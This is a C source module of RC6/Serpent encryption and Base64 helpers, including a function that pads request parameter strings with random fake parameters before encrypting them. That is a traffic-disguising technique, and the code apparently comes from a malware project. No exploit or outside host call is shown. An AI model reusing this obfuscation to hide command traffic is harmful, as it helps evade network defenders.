//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// CRYPTO library project. Version 2.1
//	
// module: cryptstr.c
// $Revision: 457 $
// $Date: 2015-01-26 18:40:30 +0300 (Пн, 26 янв 2015) $
// description: 
//	Cryptographic services provider library.

#include "..\common\main.h"
#include "stdio.h"
#include "crypto.h"

#define	_ENABLE_RC6		TRUE
//#define	_ENABLE_OUTPUT	TRUE

#pragma warning(disable:4996)	// 'strcpy': This function or variable may be unsafe. 

#define	MIN_SCRIPT_NAME_LEN	3
#define	MAX_SCRIPT_NAME_LEN	10


static PCHAR StrToB64(
	PCHAR SourceStr
	)
{
	PCHAR DestStr;

	if (DestStr = AppAlloc(((ULONG)strlen(SourceStr) * 2)))
		B64EncodeBuffer((PCHAR)SourceStr, (PCHAR)DestStr, (ULONG)strlen(SourceStr), B64_DEF_LINE_SIZE);

	return(DestStr);
}

static PCHAR B64ToStr(
	PCHAR SourceStr
	)
{
	PCHAR DestStr;

	if (DestStr = AppAlloc((ULONG)strlen(SourceStr)))
		b64decode((PCHAR)SourceStr, (PCHAR)DestStr);

	return(DestStr);
}


//
//	Encrypts/decrypts the specified memory buffer using the specified RC6 key.
//	Returns WIN32 error code.
//
ULONG RC6EncryptDecryptBuffer(
	PCHAR		InBuf,		// Source buffer to encrypt/decrypt
	ULONG		InSize,		// Source buffer size in bytes
	PCHAR*		pOutBuf,	// Variable that receives a pointer to the target buffer, the caller is responsible for freeing it.
	PULONG		pOutSize,	// Variable that receives the target buffer size in bytes
	PRC6_KEY	pRc6Key,	// RC6 key to encrypt/decrypt data with
	BOOL		bEncrypt	// Set TRUE to encrypt or FALSE to decrypt the data
	)
{
	ULONG	OutSize;
	PCHAR	OutBuf = NULL, NewBuf = NULL;
	ULONG	i, InBlocks;
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
#ifdef _SERPENT
	SERPENT_CTX	CryptCtx;
#else
	RC6CONTEXT	CryptCtx;
#endif

	if (bEncrypt)
	{
		OutSize = (InSize + (RC6_BLOCK_SIZE - 1)) & (~(RC6_BLOCK_SIZE - 1));
		if (InSize != OutSize)
		{
			ASSERT(InSize < OutSize);
			if (NewBuf = AppAlloc(OutSize))
			{
				memset(NewBuf, 0, OutSize);
				memcpy(NewBuf, InBuf, InSize);
			}
			InBuf = NewBuf;
		}	// if (InSize != OutSize)
	}	// if (bEncrypt)
	else
		OutSize = (InSize & (~(RC6_BLOCK_SIZE - 1)));
	

	if ((InBuf) && (OutBuf = AppAlloc(OutSize)))
	{
#ifdef _SERPENT
		SerpentKeySetup(&CryptCtx, pRc6Key);
#else
		RC6KeySetup(&CryptCtx, pRc6Key);
#endif

		InBlocks = OutSize / RC6_BLOCK_SIZE;

		*pOutBuf = OutBuf;
		*pOutSize = OutSize;

		for (i=0; i<InBlocks; i++)
		{
			if (bEncrypt)
#ifdef _SERPENT
				SerpentEncrypt(&CryptCtx, (PULONG)InBuf, (PULONG)OutBuf);
#else
				MainRC6Encrypt(&CryptCtx, (PULONG)InBuf, (PULONG)OutBuf);
#endif
			else
#ifdef _SERPENT
				SerpentDecrypt(&CryptCtx, (PULONG)InBuf, (PULONG)OutBuf);
#else
				MainRC6Decrypt(&CryptCtx, (PULONG)InBuf, (PULONG)OutBuf);
#endif

			InBuf += RC6_BLOCK_SIZE;
			OutBuf += RC6_BLOCK_SIZE;
		}
		Status = NO_ERROR;
	}	// if ((InBuf) && (OutBuf = AppAlloc(OutSize)))

	if (NewBuf)
		AppFree(NewBuf);

	return(Status);
}


//
//	Encrypts the specified source string with RC6 cypher using the specified key.
//	Converts the encrypted binary data into BASE64 string. 
//	Returns pointer to a buffer containing the destination string in BASE64. 
//	The caller is responsable for freeing the buffer.
//
PCHAR __stdcall RC6EncryptStringToB64(
	PCHAR		SourceStr,
	PRC6_KEY	pKey
	)
{
	PCHAR CryptStr, DestStr = NULL;
	ULONG CryptSize;

#ifdef _ENABLE_RC6
	if (RC6EncryptDecryptBuffer(SourceStr, (ULONG)strlen(SourceStr) + 1, &CryptStr, &CryptSize, pKey, TRUE) == NO_ERROR)
	{
#else
		CryptStr = SourceStr;
		CryptSize = (ULONG)strlen(SourceStr);
#endif
		if (DestStr = AppAlloc((CryptSize * 2)))
		{
			B64EncodeBuffer(CryptStr, DestStr, CryptSize, B64_DEF_LINE_SIZE);
#ifdef _ENABLE_OUTPUT
			StrTrim(DestStr, "\r\n");
			DbgPrint("CRYPTO: Encrypted string %x of %u chars to %x of %u chars, with key %s\n", Crc32(SourceStr, strlen(SourceStr)), strlen(SourceStr), Crc32(DestStr, strlen(DestStr)), strlen(DestStr), pKey);
#endif
		}

#ifdef _ENABLE_RC6
		AppFree(CryptStr);
	}
#endif
	return(DestStr);
}


//
//	Converts the specified BASE64-encoded source string into a binary data.
//	Decrypts the binary data with RC6 cypher using the specified key.
//	Returns pointer to a buffer contating the decrypted destination string.
//	The caller is responsable for freeing the buffer.
//
PCHAR __stdcall RC6DecryptStringFromB64(
	PCHAR		SourceStr,
	PRC6_KEY	pKey
	)
{
	PCHAR	CryptStr, DestStr = NULL;
	ULONG	InSize, OutSize;

	if (CryptStr = AppAlloc((ULONG)strlen(SourceStr)))
	{
		InSize = B64DecodeBuffer(SourceStr, CryptStr, (ULONG)strlen(SourceStr));
#ifdef _ENABLE_RC6
		RC6EncryptDecryptBuffer(CryptStr, InSize, &DestStr, &OutSize, pKey, FALSE);
#ifdef _ENABLE_OUTPUT
		StrTrim(DestStr, "\r\n");
		DbgPrint("CRYPTO: Decrypted string %x of %u chars to %x of %u chars, with key %s\n", Crc32(SourceStr, strlen(SourceStr)), strlen(SourceStr), Crc32(DestStr, strlen(DestStr)), strlen(DestStr), (PCHAR)pKey);
#endif
		AppFree(CryptStr);
#else
		DestStr = CryptStr;
#endif
	}

	return(DestStr);
}


//
//	Allocates and returns a string of the specified length containing random characters between 'a' and 'z' inclusively.
//
static PCHAR GetRandomString(
	ULONG Length
	)
{
	PCHAR	RndStr;
	ULONG	i;

	if (RndStr = AppAlloc((Length + 1) * sizeof(_TCHAR)))
	{
		for (i=0; i<Length; i++)
			RndStr[i] = (RsaRandom(0)%('z'-'a')) + 'a';
		RndStr[i] = 0;
	}

	return(RndStr);
}

//
//	Generates "PARAM=VALUE" script line with random PARAM and random VALUE based on the specified template.
//
PCHAR __stdcall GenScriptLine(
	PCHAR Template
	)
{
	PCHAR	ParamName, ScriptName, ScriptLine = NULL;
	ULONG	ParamNameLen, ScriptNameLen;

	ParamNameLen = (RsaRandom(0)%(MAX_SCRIPT_NAME_LEN - MIN_SCRIPT_NAME_LEN)) + MIN_SCRIPT_NAME_LEN;
	ScriptNameLen = (RsaRandom(0)%(MAX_SCRIPT_NAME_LEN - MIN_SCRIPT_NAME_LEN)) + MIN_SCRIPT_NAME_LEN;

	if (ParamName = GetRandomString(ParamNameLen))
	{
		if (ScriptName = GetRandomString(ScriptNameLen))
		{			
			if (ScriptLine = AppAlloc(((ULONG)strlen(Template) + ScriptNameLen + ParamNameLen + 1)))
				sprintf(ScriptLine, Template, ScriptName, ParamName);

			AppFree(ScriptName);
		}	// if (ScriptName = GetRandomString(ScriptNameLen))		
		AppFree(ParamName);
	}	// if (ParamName = Alloc((NameLen + 1) * sizeof(_TCHAR)))

	return(ScriptLine);
}


//
//	Obfuscates the specified parameter string by adding a fake parameter to it, encrypting it with RC6 and
//	 converting the result to BASE64. Returns the obfuscated string.
//
PCHAR __stdcall ObfuscateParamStr(
	PCHAR		SourceStr,	// the source string to obfuscate
	PRC6_KEY	pKey		// RC6 key
	)
{
	PCHAR FakeParam, NewStr, DestStr = NULL;

	if (FakeParam = GenScriptLine(_T("%s=%s&")))
	{
		if (NewStr = AppAlloc(((ULONG)strlen(FakeParam) + (ULONG)strlen(SourceStr) + 1)))
		{
			strcpy(NewStr, FakeParam);
			strcat(NewStr, SourceStr);

			DestStr = RC6EncryptStringToB64(NewStr, pKey);
			AppFree(NewStr);
		}	// if (NewStr = AppAlloc(((ULONG)strlen(FakeParam) + (ULONG)strlen(SourceStr) + 1)))
		AppFree(FakeParam);	
	}	// if (FakeParam = GenScriptLine(_T("%s=%s&")))
	return(DestStr);
}


VOID RC6EncryptDecrypt(
	HRC6		hRC6,
	PCHAR		InBuf,		// Source buffer to encrypt/decrypt, should be RC6_BLOCK_SIZE  aligned
	PCHAR		OutBuf,		// Destination buffer to encrypt/decrypt, should be RC6_BLOCK_SIZE  aligned
	ULONG		BufSize,	// Source and dest buffer size in bytes
	BOOL		bEncrypt	// Set TRUE to encrypt or FALSE to decrypt the data
	)
{
	ULONG	i, InBlocks;

	InBlocks = BufSize / RC6_BLOCK_SIZE;

	for (i=0; i<InBlocks; i++)
	{
		if (bEncrypt)
			MainRC6Encrypt(hRC6, (PULONG)InBuf, (PULONG)OutBuf);
		else
			MainRC6Decrypt(hRC6, (PULONG)InBuf, (PULONG)OutBuf);

		InBuf += RC6_BLOCK_SIZE;
		OutBuf += RC6_BLOCK_SIZE;
	}
}